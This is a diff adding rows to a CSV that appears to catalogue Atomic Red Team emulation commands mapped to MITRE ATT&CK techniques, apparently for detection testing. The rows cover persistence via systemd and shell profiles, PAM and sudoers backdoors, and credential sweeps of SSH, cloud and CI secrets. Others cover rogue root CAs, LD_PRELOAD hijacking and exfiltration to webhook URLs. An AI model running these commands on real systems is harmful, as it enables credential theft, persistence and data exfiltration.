+echo ""ExecStart=/usr/bin/python3 $HOME/.config/systemd/user/sysmon.py \""/tmp/pglog\"""" >> $HOME/.config/systemd/user/sysmon.service
+echo ""Restart=always"" >> $HOME/.config/systemd/user/sysmon.service
+echo """" >> $HOME/.config/systemd/user/sysmon.service
+echo ""[Install]"" >> $HOME/.config/systemd/user/sysmon.service
+echo ""WantedBy=default.target"" >> $HOME/.config/systemd/user/sysmon.service
+systemctl --user daemon-reload
+systemctl --user enable sysmon.service
+systemctl --user start sysmon.service
+loginctl enable-linger $USER",T1543.002,Create or Modify System Process: SysV/Systemd Service
+"echo 'echo ""Hello from Atomic Red Team T1546.004"" > /tmp/T1546.004' >> ~/.bash_profile",T1546.004,Event Triggered Execution: .bash_profile .bashrc and .shrc
+"echo 'echo ""Hello from Atomic Red Team T1546.004"" > /tmp/T1546.004' >> ~/.bashrc",T1546.004,Event Triggered Execution: .bash_profile .bashrc and .shrc
+"echo 'echo ""Hello from Atomic Red Team T1546.004"" > /tmp/T1546.004' >> ~/.shrc",T1546.004,Event Triggered Execution: .bash_profile .bashrc and .shrc
+echo '# Hello from Atomic Red Team T1546.004' >> /etc/profile,T1546.004,Event Triggered Execution: .bash_profile .bashrc and .shrc
+echo '# Atomic Red Team was here... T1546.004' >> ~/.profile,T1546.004,Event Triggered Execution: .bash_profile .bashrc and .shrc
+echo '# Atomic Red Team was here... T1546.004' >> /etc/profile.d/bash_completion.sh,T1546.004,Event Triggered Execution: .bash_profile .bashrc and .shrc
+"useradd --create-home --shell /bin/bash art
+su -l art -c ""echo 'echo \""Atomic Red Team was here... T1546.004\"" >> /home/art/art.txt' >> /home/art/.bash_logout; exit""",T1546.004,Event Triggered Execution: .bash_profile .bashrc and .shrc
+"bash -c 'trap ""nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh"" EXIT'",T1546.005,Event Triggered Execution: Trap
+"bash -c 'trap ""nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh"" EXIT'",T1546.005,Event Triggered Execution: Trap
+"bash -c 'trap ""nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh"" SIGINT && kill -SIGINT $$'",T1546.005,Event Triggered Execution: Trap
+"bash -c 'trap ""nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh"" SIGINT && kill -SIGINT $$'",T1546.005,Event Triggered Execution: Trap
+"trap 'echo ""$BASH_COMMAND"" >> /tmp/art-fish.txt' DEBUG
+whoami
+id
+hostname
+cat /tmp/art-fish.txt",T1546.005,Event Triggered Execution: Trap
+"TEMPDIR=""/tmp/atomic_sitecust_posix""
+mkdir -p ""$TEMPDIR""
+""python3"" -m venv ""$TEMPDIR/env""
+SITE_PACKAGES=$(""$TEMPDIR/env/bin/python3"" -c ""import site; print(site.getsitepackages()[0])"")
+echo ""import os; os.system('cat /etc/passwd 1> /tmp/atomic_hook_poc.txt')"" > ""$SITE_PACKAGES/atomic_hook.pth""
+ls -la ""$SITE_PACKAGES/atomic_hook.pth""
+""$TEMPDIR/env/bin/python"" -c ""print('Triggering Hook via atomic_hook...')""
+if [ -f /tmp/atomic_hook_poc.txt ]; then echo ""[+] Success: atomic_hook_poc.txt created under /tmp \n"" $(ls -la /tmp/ | grep -w atomic_hook_poc.txt); else echo ""Failed: /tmp/atomic_hook_poc.txt not found""; fi",T1546.018,Event Triggered Execution: Python Startup Hooks
+"PYTHON_EXE=$(command -v python3 || command -v python)
+USER_PACKAGES=$($PYTHON_EXE -c ""import site; print(site.getusersitepackages())"")
+mkdir -p ""$USER_PACKAGES""
+echo ""import os; os.system('date > /tmp/poc.txt')"" > ""$USER_PACKAGES/usercustomize.py""
+if [ -f ""$USER_PACKAGES/usercustomize.py"" ]; then echo ""Success: usercustomize.py created under $USER_PACKAGES\n"" $(ls -la ""$USER_PACKAGES"" | grep usercustomize*); else echo ""Failed: usercustomize.py not found under $USER_PACKAGES""; fi
+$PYTHON_EXE -c ""print('Triggering Hook via usercustomize.py...')""
+if [ -f /tmp/poc.txt ]; then echo ""Success: poc.txt created under /tmp\n"" $(ls -la /tmp/ | grep -w poc.txt); else echo ""Failed: /tmp/poc.txt not found""; fi",T1546.018,Event Triggered Execution: Python Startup Hooks
+sudo insmod /tmp/T1547.006/T1547006.ko,T1547.006,Boot or Logon Autostart Execution: Kernel Modules and Extensions
+"cp PathToAtomicsFolder/T1548.001/src/hello.c /tmp/hello.c
+sudo chown root /tmp/hello.c
+sudo make /tmp/hello
+sudo chown root /tmp/hello
+sudo chmod u+s /tmp/hello
+/tmp/hello",T1548.001,Abuse Elevation Control Mechanism: Setuid and Setgid
+"cp PathToAtomicsFolder/T1548.001/src/hello.c /tmp/hello.c
+chown root /tmp/hello.c
+make /tmp/hello
+chown root /tmp/hello
+chmod u+s /tmp/hello
+/tmp/hello",T1548.001,Abuse Elevation Control Mechanism: Setuid and Setgid
+"sudo touch /tmp/evilBinary
+sudo chown root /tmp/evilBinary
+sudo chmod u+xs /tmp/evilBinary",T1548.001,Abuse Elevation Control Mechanism: Setuid and Setgid
+"touch /tmp/evilBinary
+chown root /tmp/evilBinary
+chmod u+xs /tmp/evilBinary",T1548.001,Abuse Elevation Control Mechanism: Setuid and Setgid
+"sudo touch /tmp/evilBinary
+sudo chown root /tmp/evilBinary
+sudo chmod g+xs /tmp/evilBinary",T1548.001,Abuse Elevation Control Mechanism: Setuid and Setgid
+"touch /tmp/evilBinary
+chown root /tmp/evilBinary
+chmod g+xs /tmp/evilBinary",T1548.001,Abuse Elevation Control Mechanism: Setuid and Setgid
+"cp PathToAtomicsFolder/T1548.001/src/cap.c /tmp/cap.c
+make /tmp/cap
+sudo setcap cap_setuid=ep /tmp/cap
+/tmp/cap",T1548.001,Abuse Elevation Control Mechanism: Setuid and Setgid
+"touch /tmp/evilBinary
+sudo setcap cap_setuid=ep /tmp/evilBinary",T1548.001,Abuse Elevation Control Mechanism: Setuid and Setgid
+find /usr/bin -perm -4000,T1548.001,Abuse Elevation Control Mechanism: Setuid and Setgid
+find /usr/bin -perm -2000,T1548.001,Abuse Elevation Control Mechanism: Setuid and Setgid
+"sudo -l      
+sudo cat /etc/sudoers
+sudo vim /etc/sudoers",T1548.003,Abuse Elevation Control Mechanism: Sudo and Sudo Caching
+"sudo -l      
+sudo cat /usr/local/etc/sudoers
+sudo ee /usr/local/etc/sudoers",T1548.003,Abuse Elevation Control Mechanism: Sudo and Sudo Caching
+"sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
+sudo visudo -c -f /etc/sudoers",T1548.003,Abuse Elevation Control Mechanism: Sudo and Sudo Caching
+"sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /usr/local/etc/sudoers
+sudo visudo -c -f /usr/local/etc/sudoers",T1548.003,Abuse Elevation Control Mechanism: Sudo and Sudo Caching
+"sudo sh -c ""echo Defaults ""'!'""tty_tickets >> /etc/sudoers""
+sudo visudo -c -f /etc/sudoers",T1548.003,Abuse Elevation Control Mechanism: Sudo and Sudo Caching
+"sudo sh -c ""echo Defaults ""'!'""tty_tickets >> /usr/local/etc/sudoers""
+sudo visudo -c -f /usr/local/etc/sudoers",T1548.003,Abuse Elevation Control Mechanism: Sudo and Sudo Caching
+"export AWS_REGION=us-west-2 
+cd $PathToAtomicsFolder/T1552/src
+echo ""starting warmup""
+./stratus warmup aws.credential-access.ec2-get-password-data
+echo ""starting detonate""
+./stratus detonate aws.credential-access.ec2-get-password-data --force",T1552,Unsecured Credentials
+find / -path '*/.aws/credentials' -type f 2>/dev/null,T1552.001,Unsecured Credentials: Credentials In Files
+"grep -ri password /
+exit 0",T1552.001,Unsecured Credentials: Credentials In Files
+"find / -name '.netrc' -type f -exec sh -c 'echo ""=== $1 ==="" >> /tmp/creds.txt; cat ""$1"" >> /tmp/creds.txt' _ {} \; 2>/dev/null",T1552.001,Unsecured Credentials: Credentials In Files
+"find / -path '*/.azure/msal_token_cache.json' -type f -exec sh -c 'echo ""=== $1 ==="" >> /tmp/creds.txt; cat ""$1"" >> /tmp/creds.txt' _ {} \; 2>/dev/null",T1552.001,Unsecured Credentials: Credentials In Files
+"find / -path '*/.config/gcloud/credentials.db' -type f -exec sh -c 'echo ""=== $1 ==="" >> /tmp/creds.txt; cat ""$1"" >> /tmp/creds.txt' _ {} \; 2>/dev/null",T1552.001,Unsecured Credentials: Credentials In Files
+"find //.oci/sessions -name ""token"" -type f 2>/dev/null",T1552.001,Unsecured Credentials: Credentials In Files
+"find / -name '.travis.yml' -type f -exec sh -c 'echo ""=== $1 ==="" >> /tmp/creds.txt; cat ""$1"" >> /tmp/creds.txt' _ {} \; 2>/dev/null",T1552.001,Unsecured Credentials: Credentials In Files
+"find / -name '.gitlab-ci.yml' -type f -exec sh -c 'echo ""=== $1 ==="" >> /tmp/creds.txt; cat ""$1"" >> /tmp/creds.txt' _ {} \; 2>/dev/null",T1552.001,Unsecured Credentials: Credentials In Files
+"for filename in terraform.tfvars terraform.tfstate; do find / -name ""$filename"" -type f -exec sh -c 'echo ""=== $1 ==="" >> /tmp/creds.txt; cat ""$1"" >> /tmp/creds.txt' _ {} \; 2>/dev/null; done",T1552.001,Unsecured Credentials: Credentials In Files
+"find / -path '*/.docker/config.json' -type f -exec sh -c 'echo ""=== $1 ==="" >> /tmp/creds.txt; cat ""$1"" >> /tmp/creds.txt' _ {} \; 2>/dev/null",T1552.001,Unsecured Credentials: Credentials In Files
+"find / -name '.vault-token' -type f -exec sh -c 'echo ""=== $1 ==="" >> /tmp/creds.txt; cat ""$1"" >> /tmp/creds.txt' _ {} \; 2>/dev/null",T1552.001,Unsecured Credentials: Credentials In Files
+"find / -name '.drone.yml' -type f -exec sh -c 'echo ""=== $1 ==="" >> /tmp/creds.txt; cat ""$1"" >> /tmp/creds.txt' _ {} \; 2>/dev/null",T1552.001,Unsecured Credentials: Credentials In Files
+for pid in $(pgrep -f 'Runner.Worker|Runner.Listener|runsvc|run.sh' 2>/dev/null); do tr '\0' '\n' < /proc/$pid/environ 2>/dev/null | grep -iE 'env|ssh'; done,T1552.001,Unsecured Credentials: Credentials In Files
+"find / -name '.git-credentials' -type f -exec sh -c 'echo ""=== $1 ==="" >> /tmp/creds.txt; cat ""$1"" >> /tmp/creds.txt' _ {} \; 2>/dev/null",T1552.001,Unsecured Credentials: Credentials In Files
+"find /home /Users /root /opt /srv /var/www /app /data /var/lib /tmp -maxdepth 6 -name "".env*"" -type f -exec sh -c 'echo ""=== $1 ==="" >> /tmp/creds.txt; cat ""$1"" >> /tmp/creds.txt' _ {} \; 2>/dev/null",T1552.001,Unsecured Credentials: Credentials In Files
+"for filename in .pgpass .my.cnf .mongorc.js; do
+  find / -name ""$filename"" -type f -exec sh -c 'echo ""=== $1 ==="" >> /tmp/creds.txt; cat ""$1"" >> /tmp/creds.txt' _ {} \; 2>/dev/null
+done",T1552.001,Unsecured Credentials: Credentials In Files
+"find /etc/mysql -name 'my.cnf' -type f -exec sh -c 'echo ""=== $1 ==="" >> /tmp/creds.txt; cat ""$1"" >> /tmp/creds.txt' _ {} \; 2>/dev/null
+find /etc/redis -name 'redis.conf' -type f -exec sh -c 'echo ""=== $1 ==="" >> /tmp/creds.txt; cat ""$1"" >> /tmp/creds.txt' _ {} \; 2>/dev/null",T1552.001,Unsecured Credentials: Credentials In Files
+"find / -name '.npmrc' -type f -exec sh -c 'echo ""=== $1 ==="" >> /tmp/creds.txt; cat ""$1"" >> /tmp/creds.txt' _ {} \; 2>/dev/null",T1552.001,Unsecured Credentials: Credentials In Files
+"find / -name 'Jenkinsfile' -type f -exec sh -c 'echo ""=== $1 ==="" >> /tmp/creds.txt; cat ""$1"" >> /tmp/creds.txt' _ {} \; 2>/dev/null",T1552.001,Unsecured Credentials: Credentials In Files
+"find / -path '*/.kube/config' -type f -exec sh -c 'echo ""=== $1 ==="" >> /tmp/creds.txt; cat ""$1"" >> /tmp/creds.txt' _ {} \; 2>/dev/null",T1552.001,Unsecured Credentials: Credentials In Files
+"find /root -path '*/.kube/config' -type f -exec sh -c 'echo ""=== $1 ==="" >> /tmp/creds.txt; cat ""$1"" >> /tmp/creds.txt' _ {} \; 2>/dev/null
+find /etc/kubernetes -name '*.conf' -type f -exec sh -c 'echo ""=== $1 ==="" >> /tmp/creds.txt; cat ""$1"" >> /tmp/creds.txt' _ {} \; 2>/dev/null",T1552.001,Unsecured Credentials: Credentials In Files
+cat ~/.bash_history | grep -e '-p ' -e 'pass' -e 'ssh' > /tmp/loot.txt,T1552.003,Unsecured Credentials: Bash History
+cat ~/.history | grep -e '-p ' -e 'pass' -e 'ssh' > ~/loot.txt,T1552.003,Unsecured Credentials: Bash History
+cat ~/.zsh_history | grep -e '-p ' -e 'pass' -e 'ssh' > /tmp/loot.txt,T1552.003,Unsecured Credentials: Bash History
+cat ~/.mysql_history | grep -e 'pass' > /tmp/loot.txt,T1552.003,Unsecured Credentials: Bash History
+"find / -name ""id_rsa"" -type f -exec sh -c 'echo ""=== $1 ==="" >> /tmp/creds.txt; cat ""$1"" >> /tmp/creds.txt' _ {} \; 2>/dev/null
+exit 0",T1552.004,Unsecured Credentials: Private Keys
+"mkdir /tmp/art-staging
+find / -name id_rsa 2>/dev/null -exec cp --parents {} /tmp/art-staging \;
+exit 0",T1552.004,Unsecured Credentials: Private Keys
+"mkdir /tmp/art-staging
+find / -name id_rsa 2>/dev/null -exec gcp --parents {} /tmp/art-staging \;",T1552.004,Unsecured Credentials: Private Keys
+"mkdir /tmp/art-staging
+find / -name id_rsa 2>/dev/null -exec rsync -R {} /tmp/art-staging \;
+exit 0",T1552.004,Unsecured Credentials: Private Keys
+"mkdir /tmp/art-staging
+find / -name id_rsa 2>/dev/null -exec rsync -R {} /tmp/art-staging \;",T1552.004,Unsecured Credentials: Private Keys
+"mkdir /tmp/GnuPG
+find / -type d -name '.gnupg' 2>/dev/null -exec rsync -Rr {} /tmp/GnuPG \;
+exit 0",T1552.004,Unsecured Credentials: Private Keys
+"mkdir /tmp/GnuPG
+find / -type d -name '.gnupg' 2>/dev/null -exec rsync -Rr {} /tmp/GnuPG \;",T1552.004,Unsecured Credentials: Private Keys
+"for iface in $(wg show interfaces); do wg showconf ""$iface""; done",T1552.004,Unsecured Credentials: Private Keys
+"find /etc/wireguard -name '*.conf' -type f -exec sh -c 'echo ""=== $1 ==="" >> /tmp/creds.txt; cat ""$1"" >> /tmp/creds.txt' _ {} \; 2>/dev/null",T1552.004,Unsecured Credentials: Private Keys
+"for file_extension in *.key *.pem *.p12 *.pfx; do find / -name ""$file_extension"" -type f -exec sh -c 'echo ""=== $1 ==="" >> /tmp/creds.txt; cat ""$1"" >> /tmp/creds.txt' _ {} \; 2>/dev/null; done",T1552.004,Unsecured Credentials: Private Keys
+"token=$(curl -s --connect-timeout 2 -m 5 -X PUT ""http://169.254.169.254/latest/api/token"" -H ""X-aws-ec2-metadata-token-ttl-seconds: 21600"")
+role=$(curl -s --connect-timeout 2 -m 5 -H ""X-aws-ec2-metadata-token: $token"" ""http://169.254.169.254/latest/meta-data/iam/security-credentials/"")
+curl -s --connect-timeout 2 -m 5 -H ""X-aws-ec2-metadata-token: $token"" ""http://169.254.169.254/latest/meta-data/iam/security-credentials/$role"" -o ""/tmp/T1552.005_aws_imds_creds.json""
+if [ -s ""/tmp/T1552.005_aws_imds_creds.json"" ]; then cat ""/tmp/T1552.005_aws_imds_creds.json""; else echo ""No IAM credentials returned (host is not an EC2 instance with an attached role)""; fi",T1552.005,Unsecured Credentials: Cloud Instance Metadata API
+kubectl --context kind-atomic-cluster exec atomic-pod -- cat /run/secrets/kubernetes.io/serviceaccount/token,T1552.007,Kubernetes List Secrets
+"openssl genrsa -out rootCA.key 4096
+openssl req -x509 -new -nodes -key rootCA.key -sha256 -days 365 -subj ""/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com"" -out rootCA.crt
+cp rootCA.crt /etc/pki/ca-trust/source/anchors/
+update-ca-trust",T1553.004,Subvert Trust Controls: Install Root Certificate
+"openssl genrsa -out rootCA.key 4096
+openssl req -x509 -new -nodes -key rootCA.key -sha256 -days 365 -subj ""/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com"" -out rootCA.crt
+cp rootCA.crt /usr/local/share/certs/
+certctl rehash",T1553.004,Subvert Trust Controls: Install Root Certificate
+"mv rootCA.crt /usr/local/share/ca-certificates
+sudo update-ca-certificates",T1553.004,Subvert Trust Controls: Install Root Certificate
+python3 /tmp/LaZagne/Linux/laZagne.py browsers -firefox >> /tmp/firefox_password.txt,T1555.003,Credentials from Password Stores: Credentials from Web Browsers
+"sudo sed -i ""1s,^,auth sufficient pam_succeed_if.so uid >= 0\n,g"" /etc/pam.d/su-l",T1556.003,Modify Authentication Process: Pluggable Authentication Modules
+"sudo sed -i """" ""8s,^,auth sufficient pam_succeed_if.so uid >= 0\n,g"" /etc/pam.d/su",T1556.003,Modify Authentication Process: Pluggable Authentication Modules
+"sudo sed -i ""1s,^,auth sufficient /tmp/pam_evil.so\n,g"" /etc/pam.d/su-l",T1556.003,Modify Authentication Process: Pluggable Authentication Modules
+"zip $HOME/data.zip /var/log/{w,b}tmp",T1560.001,Archive Collected Data: Archive via Utility
+test -e $HOME/victim-gzip.txt && gzip -k $HOME/victim-gzip.txt || (echo 'confidential! SSN: 078-05-1120 - CCN: 4000 1234 5678 9101' >> $HOME/victim-gzip.txt; gzip -k $HOME/victim-gzip.txt),T1560.001,Archive Collected Data: Archive via Utility
+tar -cvzf $HOME/data.tar.gz $HOME/$USERNAME,T1560.001,Archive Collected Data: Archive via Utility
+"mkdir -p /tmp/T1560
+cd /tmp/T1560; touch a b c d e f g
+zip --password ""InsertPasswordHere"" /tmp/T1560/T1560 ./*
+echo ""InsertPasswordHere"" | gpg --batch --yes --passphrase-fd 0 --output /tmp/T1560/T1560.zip.gpg -c /tmp/T1560/T1560.zip
+ls -l /tmp/T1560",T1560.001,Archive Collected Data: Archive via Utility
+"zip -r  /tmp/t1560/t1560_data.zip /tmp/t1560
+openssl enc -aes-256-cbc -pass pass:atomic_enc_pass -p -in /tmp/t1560/t1560_data.zip -out /tmp/t1560/t1560_data.enc 
+cat /tmp/t1560/t1560_data.enc | base64",T1560.001,Archive Collected Data: Archive via Utility
+"which_python=`which python || which python3`
+$which_python -c ""import gzip;input_file=open('/etc/passwd', 'rb');content=input_file.read();input_file.close();output_file=gzip.GzipFile('/tmp/passwd.gz','wb',compresslevel=6);output_file.write(content);output_file.close();""",T1560.002,Archive Collected Data: Archive via Library
+"which_python=`which python || which python3`
+$which_python -c ""import bz2;input_file=open('/etc/passwd','rb');content=input_file.read();input_file.close();bz2content=bz2.compress(content,compresslevel=9);output_file=open('/tmp/passwd.bz2','w+');output_file.write(str(bz2content));output_file.close();""",T1560.002,Archive Collected Data: Archive via Library
+"which_python=`which python || which python3`
+$which_python -c ""from zipfile import ZipFile; ZipFile('/tmp/passwd.zip', mode='w').write('/etc/passwd')""",T1560.002,Archive Collected Data: Archive via Library
+"which_python=`which python || which python3`
+$which_python -c ""import tarfile; output_file = tarfile.open('/tmp/passwd.tar.gz','w'); output_file.add('/etc/passwd'); output_file.close()"" ",T1560.002,Archive Collected Data: Archive via Library
+"mkdir /var/tmp/.hidden-directory
+echo ""T1564.001"" > /var/tmp/.hidden-directory/.hidden-file",T1564.001,Hide Artifacts: Hidden Files and Directories
+"Write-Host ""Deploying AWS infrastructure... "" -NoNewLine
+$awsAccessKey = ""#{aws_access_key}""
+$awsSecretKey = ""#{aws_secret_key}""
+cd PathToAtomicsFolder/T1567.002/src/
+if ($awsAccessKey -eq """" -or $awsSecretKey -eq """") {
+  $env:AWS_PROFILE = ""default""
+} else {
+  $env:AWS_ACCESS_KEY_ID = ""$awsAccessKey""
+  $env:AWS_SECRET_ACCESS_KEY = ""$awsSecretKey""
+}
+$null = PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform init
+$null = PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform apply -var ""aws_region=us-east-1"" -auto-approve
+Write-Host ""Done!""
+Write-Host ""Generating rclone config... "" -NoNewLine
+$config = @""
+[exfils3]
+type = s3
+provider = AWS
+env_auth = true
+region = us-east-1
+""@
+$config | Out-File -FilePath ""PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone.conf"" -Encoding ascii
+Write-Host ""Done!""
+Write-Host ""Exfiltrating data... "" -NoNewLine
+$bucket = ""$(PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform output bucket)"".Replace(""`"""","""")
+cd PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone-v*
+$null = ./rclone copy --max-size 1700k ""PathToAtomicsFolder/../ExternalPayloads/T1567.002/data/"" exfils3:$bucket --config ""PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone.conf""
+Write-Host ""Done!""",T1567.002,Exfiltration Over Web Service: Exfiltration to Cloud Storage
+"echo ""secrets, api keys, passwords - T1567.004 atomic test"" > ""/tmp/T1567.004_loot.txt""
+curl -s -F ""file=@/tmp/T1567.004_loot.txt"" ""https://discord.com/api/webhooks/000000000000000000/ReplaceWithYourWebhookToken""",T1567.004,Exfiltration Over Web Service: Exfiltration Over Webhook
+"echo ""secrets, api keys, passwords - T1567.004 atomic test"" > ""/tmp/T1567.004_loot.txt""
+curl -s -X POST -H 'Content-type: application/json' --data ""{\""text\"":\""$(cat /tmp/T1567.004_loot.txt)\""}"" ""https://hooks.slack.com/services/T00000000/B00000000/ReplaceWithYourWebhookToken""",T1567.004,Exfiltration Over Web Service: Exfiltration Over Webhook
+"python3 ""PathToAtomicsFolder/T1568.002/src/T1568.002.py""",T1568.002,Dynamic Resolution: Domain Generation Algorithms
+psexec.py '#{domain}/Administrator:P@ssw0rd1@127.0.0.1' 'whoami',T1569.002,System Services: Service Execution
+"echo ""[Unit]"" > /etc/systemd/system/atomic-test.service
+echo ""Description=Atomic Test Service"" >> /etc/systemd/system/atomic-test.service
+echo ""After=network.target"" >> /etc/systemd/system/atomic-test.service
+echo """" >> /etc/systemd/system/atomic-test.service
+echo ""[Service]"" >> /etc/systemd/system/atomic-test.service
+echo ""ExecStart=/bin/bash -c ""echo atomictest > /tmp/atomic_service_output.txt"""" >> /etc/systemd/system/atomic-test.service
+echo ""Restart=on-failure"" >> /etc/systemd/system/atomic-test.service
+echo """" >> /etc/systemd/system/atomic-test.service
+echo ""[Install]"" >> /etc/systemd/system/atomic-test.service
+echo ""WantedBy=multi-user.target"" >> /etc/systemd/system/atomic-test.service
+systemctl daemon-reload
+systemctl enable atomic-test.service
+systemctl start atomic-test.service
+systemctl status atomic-test.service",T1569.003,System Services: Systemctl
+"echo ""[Unit]"" > /tmp/atomic_tmp.service
+echo ""Description=Atomic Tmp Service"" >> /tmp/atomic_tmp.service
+echo """" >> /tmp/atomic_tmp.service
+echo ""[Service]"" >> /tmp/atomic_tmp.service
+echo ""ExecStart=/bin/bash -c ""id > /tmp/atomic_tmp_output.txt"""" >> /tmp/atomic_tmp.service
+echo """" >> /tmp/atomic_tmp.service
+echo ""[Install]"" >> /tmp/atomic_tmp.service
+echo ""WantedBy=multi-user.target"" >> /tmp/atomic_tmp.service
+systemctl link /tmp/atomic_tmp.service
+systemctl start $(basename /tmp/atomic_tmp.service)
+systemctl status $(basename /tmp/atomic_tmp.service)",T1569.003,System Services: Systemctl
+"echo ""[Unit]"" > /dev/shm/atomic_shm.service
+echo ""Description=Atomic SHM Service"" >> /dev/shm/atomic_shm.service
+echo """" >> /dev/shm/atomic_shm.service
+echo ""[Service]"" >> /dev/shm/atomic_shm.service
+echo ""ExecStart=/bin/bash -c ""whoami > /tmp/atomic_shm_output.txt"""" >> /dev/shm/atomic_shm.service
+echo """" >> /dev/shm/atomic_shm.service
+echo ""[Install]"" >> /dev/shm/atomic_shm.service
+echo ""WantedBy=multi-user.target"" >> /dev/shm/atomic_shm.service
+systemctl link /dev/shm/atomic_shm.service
+systemctl start $(basename /dev/shm/atomic_shm.service)
+systemctl status $(basename /dev/shm/atomic_shm.service)",T1569.003,System Services: Systemctl
+"echo ""[Unit]"" > /etc/systemd/system/atomic-modify-test.service
+echo ""Description=Legitimate Looking Service"" >> /etc/systemd/system/atomic-modify-test.service
+echo """" >> /etc/systemd/system/atomic-modify-test.service
+echo ""[Service]"" >> /etc/systemd/system/atomic-modify-test.service
+echo ""ExecStart=/bin/true"" >> /etc/systemd/system/atomic-modify-test.service
+echo """" >> /etc/systemd/system/atomic-modify-test.service
+echo ""[Install]"" >> /etc/systemd/system/atomic-modify-test.service
+echo ""WantedBy=multi-user.target"" >> /etc/systemd/system/atomic-modify-test.service
+systemctl daemon-reload
+sed -i 's|ExecStart=.*|ExecStart=/bin/bash -c ""echo hijacked > /tmp/atomic_hijack_output.txt""|' /etc/systemd/system/atomic-modify-test.service
+systemctl daemon-reload
+systemctl start atomic-modify-test.service
+systemctl status atomic-modify-test.service",T1569.003,System Services: Systemctl
+"systemd-run --unit=atomic-transient --wait /bin/bash -c ""id > /tmp/atomic_transient_output.txt""
+systemctl status atomic-transient.service 2>/dev/null || echo ""Transient service has already completed and exited.""",T1569.003,System Services: Systemctl
+"systemctl list-units --type=service --all
+systemctl list-unit-files --type=service",T1569.003,System Services: Systemctl
+"echo ""[Unit]"" > /etc/systemd/system/atomic-persist.service
+echo ""Description=Atomic Persistence Service"" >> /etc/systemd/system/atomic-persist.service
+echo ""After=network.target"" >> /etc/systemd/system/atomic-persist.service
+echo """" >> /etc/systemd/system/atomic-persist.service
+echo ""[Service]"" >> /etc/systemd/system/atomic-persist.service
+echo ""ExecStart=/tmp/atomic_payload.sh"" >> /etc/systemd/system/atomic-persist.service
+echo ""Restart=always"" >> /etc/systemd/system/atomic-persist.service
+echo ""RestartSec=10"" >> /etc/systemd/system/atomic-persist.service
+echo """" >> /etc/systemd/system/atomic-persist.service
+echo ""[Install]"" >> /etc/systemd/system/atomic-persist.service
+echo ""WantedBy=multi-user.target"" >> /etc/systemd/system/atomic-persist.service
+systemctl daemon-reload
+systemctl enable atomic-persist.service
+systemctl start atomic-persist.service
+systemctl status atomic-persist.service",T1569.003,System Services: Systemctl
+"echo ""[Unit]"" > /etc/systemd/system/systemd-network-helper.service
+echo ""Description=Network connectivity helper service"" >> /etc/systemd/system/systemd-network-helper.service
+echo ""After=network.target"" >> /etc/systemd/system/systemd-network-helper.service
+echo ""Before=network-online.target"" >> /etc/systemd/system/systemd-network-helper.service
+echo """" >> /etc/systemd/system/systemd-network-helper.service
+echo ""[Service]"" >> /etc/systemd/system/systemd-network-helper.service
+echo ""ExecStart=/bin/bash -c ""echo masquerade > /tmp/atomic_masquerade_output.txt"""" >> /etc/systemd/system/systemd-network-helper.service
+echo ""Restart=on-failure"" >> /etc/systemd/system/systemd-network-helper.service
+echo ""RestartSec=5"" >> /etc/systemd/system/systemd-network-helper.service
+echo """" >> /etc/systemd/system/systemd-network-helper.service
+echo ""[Install]"" >> /etc/systemd/system/systemd-network-helper.service
+echo ""WantedBy=multi-user.target"" >> /etc/systemd/system/systemd-network-helper.service
+systemctl daemon-reload
+systemctl start systemd-network-helper.service
+systemctl status systemd-network-helper.service",T1569.003,System Services: Systemctl
+"echo quit | telnet google.com 8081
+exit 0",T1571,Non-Standard Port
+PathToAtomicsFolder/../ExternalPayloads/devtunnel host -p 8080 &,T1572,Protocol Tunneling
+nohup code tunnel --accept-server-license-terms #{additional_args} >/dev/null 2>&1 &,T1572,Protocol Tunneling
+nohup PathToAtomicsFolder/../ExternalPayloads/cloudflared tunnel --url localhost:8080 #{additional_args} >/dev/null 2>&1 &,T1572,Protocol Tunneling
+"sed -i ""s/^serverAddr = .*/serverAddr = \""127.0.0.1\""/"" PathToAtomicsFolder/../ExternalPayloads/frp/frpc.toml
+sed -i ""s/^serverPort = .*/serverPort = 7000/"" PathToAtomicsFolder/../ExternalPayloads/frp/frpc.toml
+nohup PathToAtomicsFolder/../ExternalPayloads/frp/frpc -c PathToAtomicsFolder/../ExternalPayloads/frp/frpc.toml >/dev/null 2>&1 &",T1572,Protocol Tunneling
+nohup PathToAtomicsFolder/../ExternalPayloads/gost/gost -L socks5://:1080 >/dev/null 2>&1 &,T1572,Protocol Tunneling
+sudo sh -c 'echo /tmp/T1574006.so > /etc/ld.so.preload',T1574.006,Hijack Execution Flow: LD_PRELOAD
+LD_PRELOAD=/tmp/T1574006.so ls,T1574.006,Hijack Execution Flow: LD_PRELOAD
+"aws ec2 create-launch-template \
+  --launch-template-name PathToAtomicsFolder/T1578.002/src/template.json \
+  --version-description 1 \
+  --tag-specifications 'ResourceType=launch-template,Tags=[{Key=purpose,Value=production}]' \
+  --launch-template-data file://template.json
+
+aws ec2 run-instances --image-id ami-12345678 --instance-type tg4.nano \
+  --region us-east-1 --profile default",T1578.002,Create Cloud Instance
+"printf '%s\n' '#!/bin/bash' 'date -u > /var/tmp/userdata-ran.txt' > my_script.txt
+aws ec2 run-instances \
+  --image-id ami-12345678 \
+  --instance-type tg4.nano \
+  --count 1 \
+  --subnet-id subnet-XXXXXXXXXXXXXXX \
+  --key-name MyKeyPair \
+  --user-data file://my_script.txt",T1578.002,Create Cloud Instance
+"export AWS_REGION=us-west-2
+cd $PathToAtomicsFolder/T1580/src
+echo ""Stratus: Start Warmup.""
+./stratus warmup aws.discovery.ec2-enumerate-from-instance
+echo ""Stratus: Start Detonate.""
+./stratus detonate aws.discovery.ec2-enumerate-from-instance",T1580,Cloud Infrastructure Discovery
+"Import-Module ""PathToAtomicsFolder/T1595.003/src/WebServerScan.ps1""
